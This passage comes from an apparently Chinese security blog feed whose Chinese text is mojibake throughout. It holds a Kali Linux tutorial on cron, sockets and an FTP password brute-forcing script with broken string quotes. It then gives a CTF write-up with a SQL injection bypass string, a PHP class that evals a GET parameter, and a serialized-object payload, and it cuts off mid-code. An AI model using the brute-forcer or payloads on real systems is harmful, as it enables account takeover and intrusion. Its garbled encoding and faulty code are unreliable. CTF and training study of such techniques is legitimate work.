run-parts  </span><br><span class="line"><span class="comment">#</span></span><br></pre></td></tr></table></figure><h3 id="è®¾ç½®ä¸€ä¸ªå¤‡ä»½è®¡åˆ’ä»»åŠ¡"><a href="#è®¾ç½®ä¸€ä¸ªå¤‡ä»½è®¡åˆ’ä»»åŠ¡" class="headerlink" title="è®¾ç½®ä¸€ä¸ªå¤‡ä»½è®¡åˆ’ä»»åŠ¡"></a>è®¾ç½®ä¸€ä¸ªå¤‡ä»½è®¡åˆ’ä»»åŠ¡</h3><p>åœ¨ crontab ä¸­æ·»åŠ ä¸‹è¡Œï¼š </p><figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">00 </span><span class="number">2</span> * * <span class="number">0</span> backup /bin/systembackup.sh</span><br></pre></td></tr></table></figure><p>cron å®ˆæŠ¤è¿›ç¨‹å°†åœ¨æ¯æœˆå‘¨æ—¥æ—©ä¸Š 2 ç‚¹æ‰§è¡Œé‚£ä¸ªè„šæœ¬ã€‚  </p><h3 id="crontabå¿«æ·æ–¹å¼"><a href="#crontabå¿«æ·æ–¹å¼" class="headerlink" title="crontabå¿«æ·æ–¹å¼"></a>crontabå¿«æ·æ–¹å¼</h3><p>crontab æ–‡ä»¶æœ‰äº›å†…ç½®çš„å¿«æ·æ–¹å¼ï¼Œç”¨æ¥ä»£æ›¿å…·ä½“çš„æ—¶é—´ï¼Œæ—¥æœŸï¼Œæœˆä»½ã€‚å®ƒåŒ…å«è¿™äº›ï¼š<br>179<br>â€¢ @yearly </p><p>â€¢ @annually </p><p>â€¢ @monthly </p><p>â€¢ @weekly </p><p>â€¢ @daily </p><p>â€¢ @midnight </p><p>â€¢ @noon </p><p>â€¢ @reboot<br>æ‰€ä»¥ï¼Œå¦‚æœä½ å¸Œæœ› MySQL æ‰«æå™¨æ¯å¤©åˆå¤œè¿è¡Œï¼Œä½ å¯ä»¥æ·»åŠ ä¸‹è¡Œåˆ° crontab æ–‡ä»¶ï¼š </p><p>@midnight user /usr/share/MySQLsscanner.sh </p><h3 id="ä½¿ç”¨-RC-è„šæœ¬å¼€æœºè¿è¡Œä»»åŠ¡"><a href="#ä½¿ç”¨-RC-è„šæœ¬å¼€æœºè¿è¡Œä»»åŠ¡" class="headerlink" title="ä½¿ç”¨ RC è„šæœ¬å¼€æœºè¿è¡Œä»»åŠ¡"></a>ä½¿ç”¨ RC è„šæœ¬å¼€æœºè¿è¡Œä»»åŠ¡</h3><p>Linuxè¿è¡Œçº§åˆ«</p><p>Linux æœ‰å¤šä¸ªè¿è¡Œçº§åˆ«ï¼Œç”¨äºæŒ‡ç¤ºå¯åŠ¨æ—¶éœ€è¦å¯åŠ¨å“ªäº›æœåŠ¡ã€‚ä¾‹å¦‚ï¼Œè¿è¡Œçº§åˆ« 1 æ˜¯å•ç”¨æˆ·å·¥ä½œçŠ¶æ€ï¼Œ rc è„šæœ¬ä¼šæ ¹æ®è¿è¡Œçº§åˆ«è¿è¡Œã€‚ </p><p>0 ç³»ç»ŸåœæœºçŠ¶æ€<br>1 å•ç”¨æˆ·å·¥ä½œçŠ¶æ€<br>2 â€“ 5 å¤šç”¨æˆ·çŠ¶æ€<br>6 é‡å¯ </p><p>ä½ ä»¥ä½¿ç”¨ update-rc.d å‘½ä»¤ä¸º rc.d è„šæœ¬æ·»åŠ å¯åŠ¨æ—¶è¦è¿è¡Œçš„æœåŠ¡ã€‚æ­¤å‘½ä»¤å…è®¸ä½ ä» rc.d è„šæœ¬ä¸­æ·»åŠ æˆ–åˆ  é™¤æœåŠ¡ã€‚update-rc.d çš„è¯­æ³•å¾ˆç®€å•ï¼Œè¾“å…¥å‘½ä»¤ï¼Œåé¢è¾“å…¥è„šæœ¬çš„åå­—ç„¶åè¾“å…¥åŠ¨ä½œ</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kali &gt;update-rc.d  &lt;name  of  the <span class="built_in"> script </span> <span class="keyword">or</span>  service&gt;  &lt;remove|defaults|disable|enable&gt;</span><br></pre></td></tr></table></figure><p>ä¸¾ä¸ªupdate-rc.dçš„ä¾‹å­ï¼Œå‡è®¾ä½ æ€»æ˜¯å¸Œæœ›PostgreSQL æ•°æ®åº“åœ¨ç³»ç»Ÿå¯åŠ¨æ—¶è¿è¡Œï¼Œè¿™æ ·ä½ çš„Metasploit æ¡† æ¶å¯ä»¥ä½¿ç”¨å®ƒå‚¨å­˜é»‘å®¢æ”»å‡»å’Œæ¸—é€æµ‹è¯•çš„ç»“æœã€‚ä½ éœ€è¦ä½¿ç”¨ update-rc.d æ·»ä¸€è¡Œåˆ°ä½ çš„ rc.d è„šæœ¬æ¥è®©å®ƒæ¯æ¬¡ ç³»ç»Ÿå¯åŠ¨æ—¶è¿è¡Œã€‚ </p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">update</span>-rc.d  postgresql  <span class="keyword">defaults</span></span><br></pre></td></tr></table></figure><h2 id="PYTHON-ç½‘ç»œé€šä¿¡"><a href="#PYTHON-ç½‘ç»œé€šä¿¡" class="headerlink" title="PYTHON ç½‘ç»œé€šä¿¡"></a>PYTHON ç½‘ç»œé€šä¿¡</h2><figure class="highlight d"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#! /usr/bin/python3 </span></span><br><span class="line">âŠ <span class="keyword">import</span> socket </span><br><span class="line">â‹ s = socket.socket() </span><br><span class="line">âŒ s.connect((<span class="string">"192.168.1.101"</span>, <span class="number">22</span>)) </span><br><span class="line">â answer = s.recv(<span class="number">1024</span>) </span><br><span class="line">â print(answer)</span><br></pre></td></tr></table></figure><p>é¦–å…ˆï¼Œæˆ‘ä»¬å¯¼å…¥ socket æ¨¡å—âŠï¼Œä»¥ä¾¿ä½¿ç”¨å®ƒçš„åŠŸèƒ½å’Œå·¥å…·ã€‚è¿™é‡Œï¼Œæˆ‘ä»¬å°†ä½¿ç”¨ socket æ¨¡å—ä¸­çš„ç½‘ç»œå·¥ å…·æ¥ä¸ºæˆ‘ä»¬å¤„ç†é€šè¿‡ç½‘ç»œè¿æ¥çš„æ¥å£ã€‚Socket ä¸ºä¸¤ä¸ªè®¡ç®—æœºèŠ‚ç‚¹æä¾›äº†ç›¸äº’é€šä¿¡çš„æ–¹å¼ã€‚é€šå¸¸ä¸€ä¸ªèŠ‚ç‚¹æ˜¯æœ åŠ¡ç«¯ä¸€ä¸ªæ˜¯å®¢æˆ·ç«¯ã€‚<br>ç„¶åæˆ‘ä»¬åˆ›å»ºäº†ä¸€ä¸ªæ–°çš„å˜é‡ s ï¼Œç„¶åå°†å®ƒå’Œ socket æ¨¡å—ä¸­çš„ socket ç±»å…³è”â‹ã€‚è¿™æ ·ï¼Œæ¯å½“æˆ‘ä»¬æƒ³ä½¿ ç”¨ socket ç±»æ—¶ï¼Œå°±ä¸å¿…å¼•ç”¨å®Œæ•´çš„ socket.socketï¼ˆï¼‰è¯­æ³•ï¼Œåªéœ€ä½¿ç”¨ s å˜é‡åå³å¯ã€‚<br>ç„¶åï¼Œæˆ‘ä»¬ä½¿ç”¨ socket æ¨¡å—âŒä¸­çš„ connectï¼ˆï¼‰æ–¹æ³•æ¥å»ºç«‹åˆ°ç‰¹å®š IP å’Œç«¯å£çš„ç½‘ç»œè¿æ¥ã€‚è®°ä½ï¼Œæ–¹æ³•æ˜¯ å¯ç”¨äºç‰¹å®šå¯¹è±¡çš„å‡½æ•°ï¼Œè¯­æ³•ä¸º object.methodï¼ˆä¾‹å¦‚ socket.connectï¼‰ã€‚è¿™é‡Œï¼Œæˆ‘è¿æ¥åˆ° IP åœ°å€ 192.168.1.101ï¼Œ å®ƒæ˜¯æˆ‘ç½‘ç»œä¸Šä¸€å°ç”µè„‘çš„ IP åœ°å€ï¼Œ22 ç«¯å£æ˜¯é»˜è®¤çš„ ssh ç«¯å£ã€‚æ‚¨å¯ä»¥åœ¨ Linux æˆ– Kali çš„å¦ä¸€ä¸ªå®ä¾‹ä¸Šå¯¹æ­¤ è¿›è¡Œæµ‹è¯•ã€‚å¤§å¤šæ•° 22 ç«¯å£æ˜¯é»˜è®¤æ‰“å¼€ã€‚<br>ä¸€æ—¦ä½ å»ºç«‹äº†è”ç³»ï¼Œå°±å¯ä»¥åšå¾ˆå¤šäº‹æƒ…ã€‚è¿™é‡Œæˆ‘ä»¬ä½¿ç”¨æ¥æ”¶æ–¹æ³• recv æ¥æ¥æ”¶æ¥è‡ª socket çš„ 1024 bytes æ•°æ® â å¹¶ä¸”å°†ä»–ä»¬å‚¨å­˜åˆ°ä¸€ä¸ªå« answer çš„å˜é‡é‡Œï¼›è¿™ 1024 bytes åŒ…å«äº† banner ä¿¡æ¯ã€‚ç„¶åï¼Œæˆ‘ä»¬ç”¨ print ï¼ˆï¼‰å‡½æ•°å°†è¯¥å˜é‡çš„å†…å®¹æ‰“å°åˆ°å±å¹•ä¸Šï¼Œä»¥æŸ¥çœ‹é€šè¿‡è¯¥ socket ä¼ é€’çš„æ•°æ®ï¼Œä»è€Œå…è®¸æˆ‘ä»¬ç›‘è§†å®ƒï¼åœ¨æœ€å ä¸€è¡Œï¼Œæˆ‘ä»¬å…³é—­è¿æ¥ã€‚ </p><h3 id="åˆ›å»º-TCP-ç›‘å¬å™¨"><a href="#åˆ›å»º-TCP-ç›‘å¬å™¨" class="headerlink" title="åˆ›å»º TCP ç›‘å¬å™¨"></a>åˆ›å»º TCP ç›‘å¬å™¨</h3><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/<span class="keyword">bin/python3 </span><span class="meta">import</span> socket </span><br><span class="line">âŠ TCP_IP = <span class="string">"192.168.181.190"</span> TCP_PORT = <span class="number">6996</span> </span><br><span class="line"><span class="keyword">BUFFER_SIZE </span>= <span class="number">100</span> </span><br><span class="line"> </span><br><span class="line">â‹ s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) </span><br><span class="line">âŒ s.<span class="keyword">bind((TCP_IP, </span>TCP_PORT)) </span><br><span class="line">â s.listen (<span class="number">1</span>) </span><br><span class="line"> </span><br><span class="line">â conn,<span class="keyword">addr </span>= s.accept() </span><br><span class="line"> print (<span class="string">'Connection address: '</span>, <span class="keyword">addr </span>)  </span><br><span class="line"> <span class="meta">while</span> <span class="number">1</span>: </span><br><span class="line"><span class="meta">data</span><span class="symbol">=conn</span>.recv(<span class="keyword">BUFFER_SIZE) </span></span><br><span class="line"><span class="meta">if</span> not <span class="meta">data</span>:</span><br><span class="line"><span class="keyword">break </span></span><br><span class="line">print (<span class="string">"Received data: "</span>, <span class="meta">data</span>)  </span><br><span class="line">  conn.send(<span class="meta">data</span>) <span class="symbol">#echo</span> </span><br><span class="line"> </span><br><span class="line"><span class="symbol">conn.close</span></span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬å£°æ˜å¸Œæœ›è„šæœ¬ä½¿ç”¨ Python è§£é‡Šå™¨è¿è¡Œï¼Œç„¶ååƒä»¥å‰ä¸€æ ·å¯¼å…¥å¥—æ¥å­—æ¨¡å—ï¼Œè¿™æ ·æˆ‘ä»¬å°±å¯ä»¥ä½¿ç”¨å®ƒ çš„åŠŸèƒ½ã€‚ç„¶åï¼Œæˆ‘ä»¬å®šä¹‰å˜é‡æ¥ä¿å­˜ TCP/IP åœ°å€ã€è¦ç›‘å¬çš„ç«¯å£ä»¥åŠè¦ä»è¿æ¥ç³»ç»Ÿæ•è·çš„æ•°æ®çš„ç¼“å†²åŒºå¤§ å°çš„ä¿¡æ¯âŠã€‚<br>æˆ‘ä»¬å®šä¹‰äº† socket â‹ï¼Œå¹¶ä½¿ç”¨åˆšæ‰åˆ›å»ºçš„å˜é‡å°† socket ç»‘å®šåˆ° IP åœ°å€å’Œç«¯å£âŒã€‚æˆ‘ä»¬å‘Šè¯‰ socket ä½¿ç”¨ socket åº“âä¸­çš„ listen()æ–¹æ³•è¿›è¡Œä¾¦å¬ã€‚<br>ç„¶åï¼Œæˆ‘ä»¬ä½¿ç”¨ socket åº“çš„ accept æ–¹æ³•æ•è·è¿æ¥ç³»ç»Ÿçš„ IP åœ°å€å’Œç«¯å£ï¼Œå¹¶å°†è¿™äº›ä¿¡æ¯æ‰“å°åˆ°å±å¹•ä¸Šï¼Œ<br>ä»¥ä¾¿ç”¨æˆ·å¯ä»¥çœ‹åˆ°å®ƒâã€‚</p><p>ç°åœ¨ï¼Œè½¬åˆ°ç½‘ç»œä¸Šçš„å¦ä¸€å°è®¡ç®—æœºï¼Œä½¿ç”¨æµè§ˆå™¨è¿æ¥åˆ°è„šæœ¬ä¸­æŒ‡å®šçš„ 6996 ç«¯å£ã€‚è¿è¡Œ tcp_server.py è„š æœ¬ï¼Œä½ åº”è¯¥èƒ½å¤Ÿè¿æ¥å’Œæ”¶é›†æœ‰å…³é‚£ä¸ªç³»ç»Ÿçš„å…³é”®ä¿¡æ¯ï¼ŒåŒ…æ‹¬è¿æ¥ç³»ç»Ÿçš„ IP åœ°å€å’Œç«¯å£ï¼Œå¦‚ä¸‹æ‰€ç¤ºï¼š </p><figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">kali &gt;./tcp_server.py </span><br><span class="line">Connection <span class="string">Address:</span> (<span class="string">'192.168.181.190'</span>, <span class="number">45368</span>) Received <span class="string">data:</span> Get <span class="regexp">/HTTP/</span><span class="number">1.1</span> </span><br><span class="line"><span class="string">Host:</span><span class="number">192.168</span><span class="number">.181</span><span class="number">.190</span>:<span class="number">6996</span> </span><br><span class="line">User Â­<span class="string">Agent:</span>Mozilla/<span class="number">5.0</span> (X11Í¾ Linux x86_64Í¾ <span class="string">rv:</span><span class="number">45.0</span>) Gec </span><br><span class="line"></span><br><span class="line">Â­Â­snip---</span><br></pre></td></tr></table></figure><p>è¿™æ˜¯é»‘å®¢åœ¨å†³å®šæ”»å‡»å‰æ”¶é›†çš„å…³é”®ä¿¡æ¯ã€‚æ¼æ´æ”»å‡»ï¼ˆæˆ–é»‘å®¢æ”»å‡»ï¼‰æ˜¯é’ˆå¯¹ç‰¹å®šçš„æ“ä½œç³»ç»Ÿã€åº”ç”¨ç¨‹åºï¼Œ ç”šè‡³æ˜¯æ­£åœ¨ä½¿ç”¨çš„è¯­è¨€ï¼Œå› æ­¤é»‘å®¢éœ€è¦åœ¨ç»§ç»­æ“ä½œä¹‹å‰å°½å¯èƒ½äº†è§£æœ‰å…³ç›®æ ‡çš„ä¿¡æ¯ã€‚åœ¨é»‘å®¢æ”»å‡»ä¹‹å‰æ”¶é›†ä¿¡æ¯çš„è¡Œä¸ºé€šå¸¸è¢«ç§°ä¸ºä¾¦å¯Ÿã€‚</p><h3 id="å¯†ç ç ´è§£"><a href="#å¯†ç ç ´è§£" class="headerlink" title="å¯†ç ç ´è§£"></a>å¯†ç ç ´è§£</h3><p>è¿™ä¸ªè„šæœ¬è¦æ±‚ç”¨æˆ·è¾“å…¥ ftp æœåŠ¡å™¨ å·å’Œè¦ç ´è§£çš„ ftp å¸æˆ·çš„ç”¨æˆ·åã€‚ç„¶åå®ƒè¯»å–ä¸€ä¸ªåŒ…å«å¯èƒ½å¯†ç åˆ—è¡¨çš„å¤–éƒ¨æ–‡æœ¬æ–‡ä»¶ï¼Œå¹¶å°è¯•æ¯ä¸ªå¯†ç æ¥ç ´ è§£ ftp å¸æˆ·ã€‚è„šæœ¬æ‰§è¡Œæ­¤æ“ä½œç›´åˆ°æˆåŠŸæˆ–å¯†ç ç”¨å®Œã€‚ </p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#! /usr/bin/python3 </span></span><br><span class="line">import ftplib </span><br><span class="line">âŠ<span class="built_in"> server </span>= input(FTP Server: <span class="string">") </span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string">â‹ user = input("</span>username: <span class="string">") </span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string">âŒ Passwordlist = input ("</span>Path <span class="keyword">to</span> Password List &gt; <span class="string">") </span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string">â try: </span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string">with open(Passwordlist, 'r') as pw:  </span></span><br><span class="line"><span class="string">for word in pw: </span></span><br><span class="line"><span class="string">â word = word.strip ('\r').strip('\n') </span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string">â try: </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string">ftp = ftplib.FTP(server)  </span></span><br><span class="line"><span class="string">ftp.login(user, word) </span></span><br><span class="line"><span class="string">âprint (Success! The password is ' + word) </span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string">â‘ except: </span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string">print('still trying...') </span></span><br><span class="line"><span class="string">except: </span></span><br><span class="line"><span class="string">print ('Wordlist error')</span></span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬å°†ä½¿ç”¨ ftplib æ¨¡å—ä¸­çš„å·¥å…·æ¥å®ç° FTP åè®®ï¼Œæ‰€ä»¥é¦–å…ˆæˆ‘ä»¬å¯¼å…¥å®ƒã€‚ç„¶åï¼Œæˆ‘ä»¬åˆ›å»ºä¸€ä¸ªåä¸º server çš„å˜é‡å’Œå¦ä¸€ä¸ªåä¸º user çš„å˜é‡ï¼Œå®ƒå°†å­˜å‚¨ä¸€äº›ç”¨æˆ·è¾“å…¥çš„å‘½ä»¤ã€‚ä½ çš„è„šæœ¬å°†æç¤ºç”¨æˆ·è¾“å…¥ FTP æœåŠ¡å™¨çš„ IP åœ°å€âŠå’Œç”¨æˆ·å°è¯•è¿›å…¥çš„å¸æˆ·çš„ç”¨æˆ·åâ‹ã€‚<br>ç„¶åæˆ‘ä»¬è¯¢é—®ç”¨æˆ·å¯†ç åˆ—è¡¨âŒçš„è·¯å¾„ã€‚é€šè¿‡åœ¨ç»ˆç«¯ä¸­è¾“å…¥ locate wordlistï¼Œæ‚¨å¯ä»¥åœ¨ kali linux ä¸­æ‰¾åˆ°è®¸ å¤šå¯†ç åˆ—è¡¨ã€‚<br>ç„¶åï¼Œæˆ‘ä»¬å¼€å§‹ try ä»£ç å—ï¼Œè¯¥ä»£ç å°†ä½¿ç”¨ç”¨æˆ·æä¾›çš„å¯†ç åˆ—è¡¨æ¥å°è¯•ç ´è§£ç”¨æˆ·æä¾›çš„ç”¨æˆ·åçš„å¯†ç ã€‚</p><p>æ³¨æ„ï¼Œæˆ‘ä»¬ä½¿ç”¨äº†ä¸€ä¸ªæ–°çš„åä¸º strip()âçš„ python å‡½æ•°ã€‚æ­¤å‡½æ•°åˆ é™¤å­—ç¬¦ä¸²çš„ç¬¬ä¸€ä¸ªå’Œæœ€åä¸€ä¸ªå­—ç¬¦ ï¼ˆåœ¨è¿™é‡Œæ˜¯å¯†ç åˆ—è¡¨ï¼‰ã€‚å¦‚æœæ­¤åˆ—è¡¨ä¸­çš„å¯†ç å‰é¢æœ‰ç©ºæ ¼æˆ–é€—å·ï¼Œåˆ™éœ€è¦æ‰§è¡Œæ­¤æ“ä½œã€‚strip()å‡½æ•°çš„ä½œç”¨æ˜¯ï¼š åˆ é™¤è¿™äº›å­—ç¬¦ï¼Œåªç•™ä¸‹æ½œåœ¨å¯†ç çš„å­—ç¬¦ä¸²ã€‚å¦‚æœæˆ‘ä»¬ä¸å»é™¤ç©ºç™½ï¼Œæˆ‘ä»¬å¯èƒ½ä¼šå¾—åˆ°ä¸€ä¸ªå‡é˜´æ€§ã€‚<br>ç„¶åï¼Œæˆ‘ä»¬ä½¿ç”¨ç¬¬äºŒä¸ª tryâä»£ç å—ã€‚è¿™é‡Œï¼Œæˆ‘ä»¬é¦–å…ˆä½¿ç”¨ ftplib æ¨¡å—è¿æ¥åˆ°ç”¨æˆ·æä¾›çš„ IP åœ°å€çš„æœåŠ¡ å™¨ï¼Œç„¶åä»è¯¥å¸æˆ·çš„å¯†ç åˆ—è¡¨ä¸­å°è¯•ä¸‹ä¸€ä¸ªå¯†ç ã€‚<br>å¦‚æœç”¨æˆ·åå’Œå¯†ç çš„ç»„åˆå¯¼è‡´é”™è¯¯ï¼Œåˆ™ä»£ç å—é€€å‡ºå¹¶è½¬åˆ° except å­å¥â‘ï¼Œåœ¨è¯¥å­å¥ä¸­æ‰“å° still tryingï¼Œ ç„¶åè¿”å›åˆ° for å­å¥çš„é¡¶éƒ¨å¹¶ä»å¯†ç åˆ—è¡¨ä¸­è·å–ä¸‹ä¸€ä¸ªå¯†ç ä»¥å°è¯•ã€‚<br>å¦‚æœç»„åˆæˆåŠŸï¼ŒæˆåŠŸçš„å¯†ç å°†ä¼šè¢«æ‰“å°åˆ°å±å¹•ä¸Šâã€‚æœ€åä¸€è¡Œè®°å½•ä»»ä½•å…¶ä»–å¯èƒ½å¯¼è‡´é”™è¯¯çš„æƒ…å†µã€‚ä¾‹ å¦‚ï¼Œå¦‚æœç”¨æˆ·è¾“å…¥ç¨‹åºæ— æ³•å¤„ç†çš„å†…å®¹ï¼Œä¾‹å¦‚å•è¯è¡¨çš„è·¯å¾„é”™è¯¯æˆ–ç¼ºå°‘å•è¯è¡¨ã€‚<br>ç°åœ¨ï¼Œè®©æˆ‘ä»¬å¯¹ 192.168.1.101 çš„ FTP æœåŠ¡è¿è¡Œè¿™ä¸ªè„šæœ¬ï¼Œçœ‹çœ‹æ˜¯å¦å¯ä»¥ç ´è§£ root ç”¨æˆ·çš„å¯†ç ã€‚æˆ‘ä½¿ç”¨ çš„æ˜¯æˆ‘å·¥ä½œç›®å½•ä¸­åä¸º bigpasswordlist.txt çš„å¯†ç åˆ—è¡¨ã€‚å¦‚æœå¯†ç åˆ—è¡¨ä¸åœ¨ä½ çš„å·¥ä½œç›®å½•ä¸­ï¼Œæ‚¨å¯èƒ½éœ€è¦æ ä¾›åˆ°æ‰€ä½¿ç”¨å¯†ç åˆ—è¡¨çš„å®Œæ•´è·¯å¾„ï¼ˆä¾‹å¦‚ï¼Œ/usr/share/bigpasswordlist.txtï¼‰ã€‚ </p><p>å¦‚æœæƒ³è¦å­¦ä¹ æ›´å¤š Python çŸ¥è¯†ï¼Œå¼ºçƒˆæ¨èç”± Al Sweigart ç¼–å†™çš„ No Starch Press å‡ºç‰ˆç¤¾ çš„ä¼˜ç§€ä¹¦ç±ã€ŠAutomate the Boring Stuff with Python (2015)ã€‹ã€‚ </p>]]></content>
      
      
      <categories>
          
          <category> å·¥å…·å°å±‹ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2019 ç¬¬äº”ç©ºé—´</title>
      <link href="/2019/08/29/2019%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B4/"/>
      <url>/2019/08/29/2019%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B4/</url>
      
        <content type="html"><![CDATA[<h2 id="ç©ºç›¸"><a href="#ç©ºç›¸" class="headerlink" title="ç©ºç›¸"></a>ç©ºç›¸</h2><p> ä¸€é“ç­¾åˆ°é¢˜ï¼Œæç¤ºå‚æ•°æ˜¯id  å°è¯•?id=1ä¸ºç¦æ­¢è¿›å…¥2ä¸ºtext  </p><p>?id=1â€™ or 1=1 ç»•è¿‡  </p><p>ç»™å‡ºflagçš„phpæ–‡ä»¶ï¼Œæäº¤tokenå¾—åˆ°flag</p><h2 id="å…«è‹¦"><a href="#å…«è‹¦" class="headerlink" title="å…«è‹¦"></a>å…«è‹¦</h2><p>ï¼ˆä¸‰é“webé¢˜ä¸­å”¯ä¸€æ­£å¸¸ä¸€ç‚¹çš„ï¼‰</p><p>ï¼ˆç¯å¢ƒå…³äº†ï¼Œæ—©ä¸Šåšå‡ºæ¥çš„é¢˜ï¼Œè®°ä¸å¤ªæ¸…äº†ï¼Œè®°é”™äº†ä¹Ÿï¼Œï¼Œ2333333ï¼‰</p><p>è¿›å…¥é¶æœºï¼Œå‘ç°åªæœ‰ä¸€ä¸ªwelcomeï¼Œå•¥ä¹Ÿæ²¡æœ‰ã€‚å„ç§å¤‡ä»½æ³„éœ²è¯•ä¸€æ³¢ï¼Œæœ€åå‘ç°æ˜¯phps</p><p>ç„¶åå¾—åˆ°æºç ï¼ˆuserç±»å½“æ—¶è§‰å¾—æ²¡ç”¨å°±åˆ äº†ï¼‰</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">rror_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> $careful;</span><br><span class="line">    <span class="keyword">public</span> $securuty = <span class="keyword">array</span>(<span class="string">'say_hello'</span>=&gt;<span class="string">'1'</span>);</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;careful===<span class="number">1</span>)&#123;</span><br><span class="line">            phpinfo();<span class="comment">// step 1:read source,get phpinfo and read it carefullt</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span><span class="params">($name)</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;securuty[$name];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span><span class="params">($param1,$param2)</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;&#123;$param1&#125;)&#123;</span><br><span class="line">            <span class="keyword">eval</span>(<span class="string">'$a='</span>.$_GET[<span class="string">'dangerous'</span>].<span class="string">';'</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç„¶åæ ¹æ®æç¤ºï¼Œå…ˆå»çœ‹phpinfo</p><p>æ„é€ åºåˆ—åŒ–</p><p><img src="https://i.loli.net/2020/04/30/L8aHUJR5WuMCbdr.png" alt="![](https://i.loli.net/2020/04/30/L8aHUJR5WuMCbdr.png)"></p><p>O:4:â€Testâ€:2:{s:10:â€ * carefulâ€;i:1;s:8:â€securutyâ€;a:1:{s:9:â€say_helloâ€;s:1:â€1â€;}}</p><p>å› ä¸ºprotectedçš„å…³ç³»ï¼Œå¥½åƒä¸­é—´æœ‰æˆªæ–­ï¼Œæ‰€ä»¥urlencodeï¼Œ</p><p>ç„¶åä¼ ç»™fooï¼Œå¾—åˆ°phpinfo</p><p>ctrl f æœç´¢.php å¾—åˆ°ä¸€ä¸ª preload.phpï¼ˆå…·ä½“å•¥åå­—å¿˜è®°äº†ï¼‰</p><p>ç„¶åå¾—åˆ°æºç </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Welcome</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">say_hello</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"welcome&lt;br&gt;"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Welcome_again</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $willing ;</span><br><span 